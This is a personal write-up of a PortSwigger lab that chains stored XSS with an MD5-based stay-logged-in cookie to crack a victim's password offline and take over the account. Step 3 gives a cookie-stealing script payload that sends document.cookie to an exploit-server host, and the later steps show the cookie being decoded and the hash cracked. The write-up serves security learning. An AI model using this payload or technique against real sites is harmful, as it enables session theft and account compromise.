# PortSwigger Lab – Offline Password Cracking

## Lab Details
Category: Server-Side Authentication (Other Mechanisms)  
Level: Practitioner  
Status: Solved   

---

## What This Lab Is About
This lab demonstrates how **passwords can be cracked offline** when applications:

- Store password hashes client-side
- Use weak hashing algorithms (MD5)
- Expose authentication cookies via XSS

By combining a **stored XSS vulnerability** with a **predictable stay-logged-in cookie**, it’s possible to steal a victim’s hash and crack their password without interacting with the login mechanism at all.

---

## Goal of the Lab
- Steal Carlos’s stay-logged-in cookie using XSS
- Extract and crack the password hash
- Log in as Carlos
- Delete Carlos’s account

---

## Given Credentials
- My account: `wiener : peter`
- Victim username: `carlos`

---

## Tools Used
- Burp Suite
  - Proxy
  - Decoder
- Exploit Server
- Browser
- Online hash lookup (for demonstration)

---

## How I Solved It

### 1. Analyzing the Stay-Logged-In Cookie
With Burp running, I logged in to my own account using **Stay logged in**.

From the response to the login request, I examined the cookie and found that it was **Base64 encoded**.

After decoding, the structure was:
```

username:md5HashOfPassword

````

This confirms that:
- The password hash is stored client-side
- MD5 is used, which is fast and insecure
- The hash can be cracked offline once obtained

---

### 2. Identifying the XSS Vulnerability
I noticed that the blog comment functionality was vulnerable to **stored cross-site scripting (XSS)**.

This makes it possible to execute JavaScript in another user’s browser and steal sensitive data such as cookies.

---

### 3. Stealing Carlos’s Cookie
I opened the **Exploit Server** and copied my unique exploit URL.

I then posted the following comment on a blog post, replacing the exploit server ID with my own:

```html
<script>
document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie
</script>
````

Because the XSS is stored, this payload executes when Carlos views the blog post.

---

### 4. Capturing the Cookie

On the exploit server, I checked the **access log** and observed a GET request from Carlos’s browser.

The request contained his cookie, including:

```
stay-logged-in=cGFybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz
```

I decoded this value using **Burp Decoder**, resulting in:

```
carlos:26323c16d5f4dabff3bb136f2460a943
```

---

### 5. Cracking the Password Offline

I copied the MD5 hash:

```
26323c16d5f4dabff3bb136f2460a943
```

Cracking the hash revealed the password:

```
onceuponatime
```

This demonstrates how dangerous it is to use fast hashing algorithms and expose hashes client-side.

---

### 6. Taking Over the Account

Using the recovered credentials, I logged in as Carlos:

```
carlos : onceuponatime
```

I navigated to **My account** and deleted the account, completing the lab.

---

## Why This Is a Serious Vulnerability

This attack succeeds because the application:

* Stores password hashes in client-side cookies
* Uses MD5 instead of a slow, salted password hash
* Allows stored XSS
* Does not protect cookies with HttpOnly

Any one of these issues is dangerous — combined, they lead to full account compromise.

---

## Key Takeaways

* Password hashes should never be exposed to the client
* MD5 is unsuitable for password storage
* XSS can directly lead to authentication compromise
* Offline password cracking bypasses login protections entirely

---

## Impact

* Account takeover
* Password disclosure
* Permanent account deletion
* Full compromise without brute-force detection

---

## Why I’m Documenting This

I’m documenting this lab to:

* Demonstrate chaining vulnerabilities (XSS → auth bypass)
* Show understanding of offline password attacks
* Build a professional security learning portfolio
* Prepare for real-world web application testing

 
